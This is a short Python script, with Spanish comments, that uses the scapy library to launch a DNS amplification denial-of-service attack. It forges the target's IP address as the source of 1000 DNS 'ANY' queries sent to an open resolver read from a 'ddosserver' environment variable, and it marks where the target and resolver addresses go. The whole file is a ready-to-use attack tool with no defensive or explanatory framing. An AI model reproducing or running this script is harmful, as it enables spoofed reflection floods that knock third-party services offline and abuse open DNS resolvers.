from scapy.all import *
import os

# Obtén la dirección IP del servidor desde la variable de entorno
ddosserver_ip = os.getenv("ddosserver")

if ddosserver_ip is None:
    print("No se proporcionó una dirección IP para el servidor. Asegúrate de configurar la variable de entorno ddosserver. Ejecuta export ddosserver=¨ip¨")
    exit()

target_ip = "example.com" # Replace with the target IP address
open_dns_resolver = ddosserver_ip # Replace with an open DNS resolver IP
dns_query_packets = 1000 # Modify as necessary

# Craft DNS query packet
dns_query = IP(src=target_ip, dst=open_dns_resolver) / UDP(sport=RandShort(), dport=53) / \
DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
# Send the packet multiple times for amplification
send(dns_query, count= dns_query_packets)